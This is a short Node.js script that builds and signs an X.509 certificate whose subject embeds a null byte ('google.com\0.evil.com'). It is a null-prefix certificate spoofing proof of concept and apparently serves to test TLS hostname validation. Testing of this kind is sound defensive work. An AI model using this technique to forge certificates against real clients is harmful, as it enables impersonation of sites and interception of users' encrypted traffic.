var rfc3280 = require('asn1.js-rfc3280');
var utils = require('./utils');
var fs = require('fs');
var ursa = require('ursa');

// Input: private key
var pem = fs.readFileSync(process.argv[2]);

var priv = pem.toString().split(/[\r\n]+/g).slice(1, -1).join('');
priv = utils.RSAPrivateKey.decode(new Buffer(priv, 'base64'), 'der');

// Get public key out of it
var pub = utils.RSAPublicKey.encode(priv, 'der');

// Certficiate data to encode and sign
var data = utils.genCertData('evil.com', 'google.com\0.evil.com', pub);
var tbs = rfc3280.TBSCertificate.encode(data, 'der')

var signature = ursa.createPrivateKey(pem).hashAndSign('sha1', tbs);

var cert = rfc3280.Certificate.encode({
  tbsCertificate: data,
  signatureAlgorithm: {
    algorithm: utils.RSA
  },
  signature: { unused: 0, data: signature }
}, 'der');

var b64 = cert.toString('base64');
var out = [ '-----BEGIN CERTIFICATE-----' ];

for (var i = 0; i < b64.length; i += 64)
  out.push(b64.slice(i, i + 64));

out.push('-----END CERTIFICATE-----');
console.log(out.join('\n'));
